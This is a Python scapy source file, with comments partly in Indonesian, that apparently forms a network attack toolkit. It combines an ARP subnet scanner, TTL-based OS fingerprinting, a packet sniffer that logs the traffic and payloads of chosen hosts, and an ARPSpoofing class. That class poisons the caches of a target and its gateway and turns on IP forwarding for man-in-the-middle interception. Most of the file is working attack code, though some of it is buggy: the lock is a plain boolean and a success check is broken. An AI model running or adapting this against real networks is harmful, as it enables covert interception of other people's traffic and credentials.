from scapy.all import srp, Ether, ARP, conf, sniff, IP, TCP, UDP, Raw, PcapWriter, send, sr1, ICMP
from scapy.utils import PcapWriter
from scapy.data import ETHER_TYPES, MANUFDB
import socket
import json
from datetime import datetime
from threading import Thread, Event
import threading
from typing import List, Optional, Callable
import sys
import time
from getmac import get_mac_address

conf.use_pcap = True

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def get_mac(ip):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
    return ans[0][1].hwsrc

def get_gateway_ip():
    gateway = conf.route.route("0.0.0.0")[2]
    return gateway

def os_fingerprint(ip):
    try:
        pkt = IP(dst=ip)/ICMP()
        ans = sr1(pkt, timeout=2, verbose=False)
        
        if not ans:
            return {'ip': ip, 'status': 'down'}
        
        if ans:
            icmp_layer = ans.getlayer(ICMP)
            if icmp_layer.type == 0:
                ttl = ans.ttl
                
                if ttl > 128:
                    initial_ttl = 255
                elif ttl > 64:
                    initial_ttl = 128
                else:
                    initial_ttl = 64
                    
                hops = initial_ttl - ttl
                
                mac = get_mac_address(ip=str(ip), network_request=True)
                
                os_guest = "Unknown"
                if initial_ttl == 64:
                    os_guest = "Linux/Unix/Mac"
                elif initial_ttl == 128:
                    os_guest = "Windows"
                elif initial_ttl == 255:
                    os_guest = "Network Devices"
                
                return {
                    'ip': ip,
                    'ttl': ttl,
                    'initial_ttl': initial_ttl,
                    'hops': hops,
                    'os': os_guest,
                    'status': 'up',
                    'mac': mac
                }
            elif icmp_layer.type == 3:
                return {'ip': ip, 'status': 'uncherable'}
            
    except Exception as e:
        return {'ip': ip, 'status': 'error', 'error': str(e)}

def get_hostname(ip):
    try:
        hstnm = socket.gethostbyaddr(ip)[0]
        return hstnm
    except:
        return "Unknown"

def get_vendor_mac(mac):
    try:
        vendor = MANUFDB.get(mac, "Unknown")
        return vendor
    except:
        return "Unknown"

def scapy_arp_scan(timeout=2, iface=None):
    """
    Lakukan ARP scan ke /24 berdasarkan IP lokal. memerlukan root
    Return List of {'ip': ..., 'mac': ...}
    """
    conf.verb = 0
    try: 
        local_ip = get_local_ip()
    except Exception:
        return []
    parts = local_ip.split('.')
    network = '.'.join(parts[:3]) + '.0/24'
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=timeout, iface=iface, inter=0.1)
    
    results = []
    for _, rcv in ans:
        results.append({'ip': rcv.psrc, 'mac': rcv.hwsrc})
    return results

class IPSniffer:
    """
    IPSniffer: sniff traffic involving specified IP(s), write to pcap/jsonl and print summary.

    Usage:
        s = IPSniffer(iface="eth0", ips=["192.168.1.10"], pcap_path="out.pcap", jsonl_path="out.jsonl")
        t = s.start(background=True)   # returns Thread
        # ... later ...
        s.stop()    # signal to stop
        t.join()
    """

    def __init__(self,
                 iface: Optional[str],
                 ips: List[str],
                 pcap_path: Optional[str] = None,
                 jsonl_path: Optional[str] = None,
                 bpf: bool = True,
                 on_packet: Optional[Callable] = None):
        self.iface = iface
        self.ips = ips or []
        self._target_set = set(self.ips)
        self.pcap_path = pcap_path
        self.jsonl_path = jsonl_path
        self.bpf_enabled = bpf and bool(self.ips)
        self.on_packet = on_packet

        # Stop control
        self._running = False
        self._stop_event = Event()
        self._stop_sniffing = False  # Additional flag for double-check
        self._thread = None
        self._packet_count = 0

        # writers
        self._pw: Optional[PcapWriter] = None
        if self.pcap_path:
            try:
                self._pw = PcapWriter(self.pcap_path, append=True, sync=True)
            except Exception as e:
                print(f"[IPSniffer] Warning: failed to open pcap writer: {e}", file=sys.stderr)
                self._pw = None

        self._json_fd = None
        if self.jsonl_path:
            try:
                self._json_fd = open(self.jsonl_path, "a", encoding="utf-8")
            except Exception as e:
                print(f"[IPSniffer] Warning: failed to open jsonl file: {e}", file=sys.stderr)
                self._json_fd = None

    @staticmethod
    def _build_bpf_for_ips(ips: List[str]) -> str:
        if not ips:
            return ""
        return " or ".join(f"host {ip}" for ip in ips)

    @staticmethod
    def _short_payload(payload: bytes, length: int = 300) -> str:
        try:
            return payload.decode("utf-8", errors="replace")[:length]
        except Exception:
            return "<binary>"

    def _packet_summary(self, pkt) -> dict:
        ts = datetime.utcnow().isoformat() + "Z"
        summary = {"ts": ts}
        if IP in pkt:
            ip_layer = pkt[IP]
            summary.update({
                "src": ip_layer.src,
                "dst": ip_layer.dst,
                "proto": ip_layer.proto,
            })
            if pkt.haslayer(TCP):
                summary.update({"sport": pkt[TCP].sport, "dport": pkt[TCP].dport, "l4": "TCP"})
            elif pkt.haslayer(UDP):
                summary.update({"sport": pkt[UDP].sport, "dport": pkt[UDP].dport, "l4": "UDP"})
            if pkt.haslayer(Raw):
                summary["payload"] = self._short_payload(pkt[Raw].load, 300)
        else:
            summary["info"] = pkt.summary()

        summary["target_involved"] = (summary.get("src") in self._target_set) or (summary.get("dst") in self._target_set)
        return summary

    def _should_stop_packet(self, pkt) -> bool:
        """
        Stop filter function for scapy sniff()
        Returns True to stop sniffing
        """
        return self._stop_sniffing or self._stop_event.is_set()

    def _prn(self, pkt):
        # Check stop condition first
        if self._should_stop_packet(pkt):
            return True  # Signal to stop

        try:
            summ = self._packet_summary(pkt)
        except Exception as e:
            print(f"[IPSniffer] Error building summary: {e}", file=sys.stderr)
            return

        if not summ.get("target_involved"):
            return

        self._packet_count += 1

        # print concise summary
        src = summ.get("src", "n/a")
        dst = summ.get("dst", "n/a")
        proto = summ.get("l4", summ.get("proto"))
        sport = summ.get("sport")
        dport = summ.get("dport")
        line = f"[{self._packet_count}] {summ['ts']} {src} -> {dst} proto={proto}"
        if sport is not None and dport is not None:
            line += f" {sport}->{dport}"
        print(line, flush=True)

        # write to pcap if available
        if self._pw:
            try:
                self._pw.write(pkt)
            except Exception as e:
                print(f"[IPSniffer] Failed to write pcap: {e}", file=sys.stderr)

        # write to jsonl if available
        if self._json_fd:
            try:
                self._json_fd.write(json.dumps(summ, ensure_ascii=False) + "\n")
                self._json_fd.flush()
            except Exception as e:
                print(f"[IPSniffer] Failed to append jsonl: {e}", file=sys.stderr)
        
        # Call callback (non-blocking if callback quick)
        if self.on_packet:
            try:
                self.on_packet(summ)
            except Exception as e:
                print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)

    def _sniff_loop(self, timeout: Optional[int], count: int):
        """
        Internal sniff loop with improved stop mechanism
        """
        print(f"[IPSniffer] Starting sniff loop on {self.iface} for IPs: {self.ips}")
        
        bpf_filter = ""
        if self.bpf_enabled:
            bpf_filter = self._build_bpf_for_ips(self.ips)
            if bpf_filter:
                print(f"[IPSniffer] Using BPF filter: {bpf_filter}")

        sniff_kwargs = {
            "iface": self.iface,
            "prn": self._prn,
            "store": False,
            "stop_filter": self._should_stop_packet,  # KEY: This enables stopping
        }
        
        if bpf_filter:
            sniff_kwargs["filter"] = bpf_filter

        self._running = True
        self._stop_sniffing = False
        start_time = time.time()
        
        try:
            # Calculate end time if timeout is set
            end_time = None
            if timeout is not None and timeout > 0:
                end_time = start_time + float(timeout)

            while not self._stop_event.is_set() and not self._stop_sniffing:
                # Check global timeout
                if end_time and time.time() >= end_time:
                    print("[IPSniffer] Global timeout reached")
                    break

                # Calculate remaining time for this chunk
                chunk_timeout = 2.0  # Short chunks for responsiveness
                if end_time:
                    remaining = end_time - time.time()
                    if remaining <= 0:
                        break
                    chunk_timeout = min(chunk_timeout, max(0.5, remaining))

                print(f"[IPSniffer] Sniffing chunk (timeout={chunk_timeout:.1f}s)...", flush=True)
                
                try:
                    # Sniff with timeout for this chunk
                    sniff(timeout=chunk_timeout, **sniff_kwargs)
                    
                    # Check stop condition after each chunk
                    if self._stop_event.is_set() or self._stop_sniffing:
                        print("[IPSniffer] Stop signal detected after chunk")
                        break
                        
                except KeyboardInterrupt:
                    print("[IPSniffer] KeyboardInterrupt received")
                    break
                    
                except Exception as e:
                    print(f"[IPSniffer] sniff() raised: {e}", file=sys.stderr)
                    if self.bpf_enabled and "filter" in str(e).lower():
                        # BPF filter error — retry without filter
                        print("[IPSniffer] Retrying without BPF filter", file=sys.stderr)
                        self.bpf_enabled = False
                        sniff_kwargs.pop("filter", None)
                        continue
                    else:
                        # Unrecoverable error
                        print("[IPSniffer] Unrecoverable error, stopping", file=sys.stderr)
                        break

        except Exception as e:
            print(f"[IPSniffer] Unexpected error in sniff loop: {e}", file=sys.stderr)
            
        finally:
            self._running = False
            self._stop_sniffing = True
            self.close()
            elapsed = time.time() - start_time
            print(f"[IPSniffer] Sniffing stopped. Captured {self._packet_count} packets in {elapsed:.1f}s", flush=True)

    def start(self, timeout: Optional[int] = None, count: int = 0, background: bool = False) -> Optional[Thread]:
        """
        Start sniffing.
        - timeout: total seconds to run (None = indefinite)
        - count: (currently unused) reserved for future matched-packet stop
        - background: if True, runs in a daemon Thread and returns the Thread object
        """
        if self._running:
            print("[IPSniffer] Warning: already running", file=sys.stderr)
            return self._thread
            
        if not self.ips:
            print("[IPSniffer] Warning: no target IPs specified; will match all traffic", file=sys.stderr)

        self._stop_event.clear()
        self._stop_sniffing = False
        self._packet_count = 0
        
        if background:
            self._thread = Thread(target=self._sniff_loop, args=(timeout, count), daemon=False)
            self._thread.start()
            print(f"[IPSniffer] Started in background (thread: {self._thread.name})")
            return self._thread
        else:
            self._sniff_loop(timeout, count)
            return None

    def stop(self):
        """
        Signal the sniffer to stop (safe to call from another thread).
        This is thread-safe and will cause sniff() to exit.
        """
        if not self._running:
            print("[IPSniffer] Already stopped or not running")
            return
            
        print("[IPSniffer] Stop requested - setting flags...")
        self._stop_sniffing = True
        self._stop_event.set()
        
        # Give it a moment to process the stop signal
        if self._thread and self._thread.is_alive():
            print(f"[IPSniffer] Waiting for thread to finish (max 5s)...")
            self._thread.join(timeout=5)
            
            if self._thread.is_alive():
                print("[IPSniffer] Warning: thread still alive after timeout")
            else:
                print("[IPSniffer] Thread stopped successfully")

    def close(self):
        """Close writers and cleanup."""
        print("[IPSniffer] Closing writers...")
        try:
            if self._pw:
                try:
                    self._pw.flush()
                    self._pw.close()
                    print("[IPSniffer] PCAP writer closed")
                except Exception as e:
                    print(f"[IPSniffer] Error closing PCAP: {e}", file=sys.stderr)
                finally:
                    self._pw = None
        finally:
            if self._json_fd:
                try:
                    self._json_fd.flush()
                    self._json_fd.close()
                    print("[IPSniffer] JSONL writer closed")
                except Exception as e:
                    print(f"[IPSniffer] Error closing JSONL: {e}", file=sys.stderr)
                finally:
                    self._json_fd = None

    @property
    def is_running(self) -> bool:
        return self._running
    
    @property
    def packet_count(self) -> int:
        return self._packet_count
    
class ARPSpoofing:
    def __init__(self,
        target_ip: str, # IP Target
        gateway_ip: str, # IP Gateway
        iface: Optional[str] = None, # Network interface, jika tidak ada set dfault None
        interval: float = 2.0,
        on_packet: Optional[Callable] = None):

        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.interval = interval
        self.on_packet = on_packet
        
        # Var untuk menyimpan MAC
        self.target_mac = None
        self.gateway_mac = None
        
        # Control Flag
        self._runnning = False
        self._poisoned = False
        
        # Threading
        self._thread = None
        self._lock = False
        
        conf.verb = 0
        
        print("[ARPSpoofing] initialized ✓ ")
        print(f"Target IP: {self.target_ip}")
        print(f"Gateway IP: {self.gateway_ip}")
        print(f"Interface: {self.iface}")
        
    def _log(self, message: str):
        """Helper untuk logging dengan callback"""
        print(message)
        if self.on_packet:
            try:
                self.on_packet(message)
            except Exception as e:
                print(f"[ARPSpoofing] on_packet callback error: {e}", file=sys.stderr)

        
    def _spoof(self, target_ip: str, spoof_ip: str, target_mac: str):
        packet = ARP(op=2, # ARP reply
                     pdst=target_ip, # Target IP
                     hwdst=target_mac, # Target MAC
                     psrc=spoof_ip) #source ip
                    
                    #hwsrc adalah mac kita
        
        send(packet, iface=self.iface, verbose=False)
     
    def _restore(self, dest_ip: str, source_ip: str, dest_mac: str, source_mac: str):   
        packet = ARP(op=2, # ARP reply
                     pdst=dest_ip, # Target IP
                     hwdst=dest_mac, # Target MAC
                     psrc=source_ip, #source ip
                     hwsrc=source_mac) #source mac
        
        send(packet, iface=self.iface, count = 5, verbose=False)
    
    def enable_ip_forwarding(self): 
        try: 
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
                self._log("[ARPSpoofing] ✓ IP forwarding enabled")
        except Exception as e:
            self._log(f"[ARPSpoofing] ✗ Failed to enable IP forwarding: {e}")
            self._log("  Try manually: echo 1 > /proc/sys/net/ipv4/ip_forward")
            return False
    
    def disable_ip_forwarding(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0\n")
                self._log("[ARPSpoofing] ✓ IP forwarding disabled")
        except Exception as e:
            self._log(f"[ARPSpoofing] ✗ Failed to disable IP forwarding: {e}")
            self._log("  Try manually: echo 0 > /proc/sys/net/ipv4/ip_forward")
            return False
    
    def _poison_loop(self):
        """Loop poisoning yang berjalan di thread terpisah"""
        packet_count = 0
        
        while self._running:
            try:
                # Poison target
                self._spoof(self.target_ip, self.gateway_ip, self.target_mac)
                # Poison gateway
                self._spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                
                packet_count += 2
                self._log(f"[ARPSpoofing] Sent {packet_count} ARP packets...")
                
                time.sleep(self.interval)
                
            except Exception as e:
                self._log(f"[ARPSpoofing] Error in poison loop: {e}")
                break
        
            self._log("[ARPSpoofing] Poison loop stopped")
    
    def start(self, enable_forwarding: bool = True, background: bool = True) -> dict:
        with self._lock:
            if self._running:
                return {
                    "success": False,
                    "message": "ARP spoofing already running",
                    "is_running": True,
                    "thread": self._thread
                }

            self._log("\\n[ARPSpoofing] Starting ARP poisoning attack...")

            # Get MAC addresses
            self.target_mac = str(get_mac_address(ip=str(self.target_ip), network_request=True))
            self.gateway_mac = str(get_mac_address(ip=str(self.gateway_ip), network_request=True))

            if not self.target_mac or self.target_mac == "None":
                msg = f"Could not find target MAC for {self.target_ip}"
                self._log(f"[ARPSpoofing] ✗ {msg}")
                return {
                    "success": False,
                    "message": msg,
                    "is_running": False,
                    "thread": None
                }

            if not self.gateway_mac or self.gateway_mac == "None":
                msg = f"Could not find gateway MAC for {self.gateway_ip}"
                self._log(f"[ARPSpoofing] ✗ {msg}")
                return {
                    "success": False,
                    "message": msg,
                    "is_running": False,
                    "thread": None
                }

            # Enable IP forwarding
            if enable_forwarding:
                if not self.enable_ip_forwarding():
                    return {
                        "success": False,
                        "message": "Failed to enable IP forwarding",
                        "is_running": False,
                        "thread": None
                    }

            # Set flags
            self._running = True
            self._poisoned = True

            if background:
                # Start thread
                self._thread = threading.Thread(
                    target=self._poison_loop,
                    daemon=True,
                    name=f"ARP-{self.target_ip}"
                )
                self._thread.start()

                self._log(f"\\n[ARPSpoofing] ✓ Poisoning started in background thread!")
                self._log(f"  Target: {self.target_ip} ({self.target_mac})")
                self._log(f"  Gateway: {self.gateway_ip} ({self.gateway_mac})")
                self._log(f"  Interval: {self.interval}s")

                return {
                    "success": True,
                    "message": "ARP spoofing started successfully",
                    "is_running": True,
                    "target_ip": self.target_ip,
                    "target_mac": self.target_mac,
                    "gateway_ip": self.gateway_ip,
                    "gateway_mac": self.gateway_mac,
                    "interval": self.interval,
                    "thread": self._thread  # Return thread object
                }
            else:
                # Blocking mode
                self._log(f"\\n[ARPSpoofing] ✓ Starting poisoning (blocking mode)...")
                try:
                    self._poison_loop()
                except KeyboardInterrupt:
                    self._log("\\n[ARPSpoofing] Interrupted by user")
                finally:
                    self.stop()

                return {
                    "success": True,
                    "message": "ARP spoofing completed",
                    "is_running": False,
                    "thread": None
                }

    
    def stop(self) -> dict:
        with self._lock:
            if not self._running and not self._poisoned:
                return {
                    "success": False,
                    "message": "ARP spoofing not running",
                    "is_running": False
                }

            self._log("\\n[ARPSpoofing] Stopping ARP poisoning...")

            # Stop the loop
            self._running = False

            # Wait for thread to finish (with timeout)
            if self._thread and self._thread.is_alive():
                self._thread.join(timeout=5)

            # Restore ARP tables
            if self._poisoned and self.target_mac and self.gateway_mac:
                self._log("[ARPSpoofing] Restoring ARP tables...")

                # Restore target's ARP table
                self._log(f"  Restoring {self.target_ip}'s ARP table...")
                self._restore(self.target_ip, self.gateway_ip,
                            self.target_mac, self.gateway_mac)

                # Restore gateway's ARP table
                self._log(f"  Restoring {self.gateway_ip}'s ARP table...")
                self._restore(self.gateway_ip, self.target_ip,
                            self.gateway_mac, self.target_mac)

                self._log("[ARPSpoofing] ✓ ARP tables restored")
                self._poisoned = False

            self._log("[ARPSpoofing] ✓ Stopped successfully")

            return {
                "success": True,
                "message": "ARP spoofing stopped and ARP tables restored",
                "is_running": False
            }

    def status(self) -> dict:
        return {
            "is_running": self._running,
            "is_poisoned": self._poisoned,
            "target_ip": self.target_ip,
            "target_mac": self.target_mac,
            "gateway_ip": self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "interval": self.interval,
            "thread_alive": self._thread.is_alive() if self._thread else False
        }

    @property
    def is_running(self) -> bool:
        return self._running
    
if __name__ == "__main__":
    # Test ARP scan
    print("Testing ARP scan...")
    results = scapy_arp_scan()
    print(f"Found {len(results)} devices:")
    for r in results:
        print(f"  {r['ip']} - {r['mac']}")
    
    # Test IP sniffer (uncomment to test)
    # print("\nTesting IP Sniffer (Ctrl+C to stop)...")
    # sniffer = IPSniffer(iface="eth0", ips=["192.168.1.1"])
    # thread = sniffer.start(timeout=10, background=True)
    # 
    # import time
    # time.sleep(5)
    # print("Stopping sniffer...")
    # sniffer.stop()
    # thread.join()
    # print(f"Captured {sniffer.packet_count} packets")